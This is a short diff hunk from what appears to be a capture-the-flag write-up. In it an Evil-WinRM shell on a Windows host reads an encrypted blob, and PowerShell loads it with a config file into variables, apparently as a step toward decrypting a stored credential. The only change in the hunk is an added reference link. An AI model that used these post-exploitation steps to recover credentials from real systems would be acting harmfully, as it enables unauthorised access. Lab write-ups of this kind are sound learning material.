@@ -657,7 +657,7 @@ Clock Time (ms.) Total     : 1      Average : (1000.00 rows per sec.)
 *Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> type c:\users\mhope\documents\out2.txt
 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=
 ```
-Step 3 completed, let's follow through with Step 4 - we can store the contents of the files into the PowerShell variables `$config` and `$crypted` like this:
+Step 3 completed, let's follow through with Step 4 - we can [store the contents of the files into the PowerShell variables](https://stackoverflow.com/questions/7976646/powershell-store-entire-text-file-contents-in-variable) `$config` and `$crypted` like this:
 ```
 $config = [IO.File]::ReadAllText("C:\users\mhope\documents\out.txt")
 $crypted = [IO.File]::ReadAllText("C:\users\mhope\documents\out2.txt")
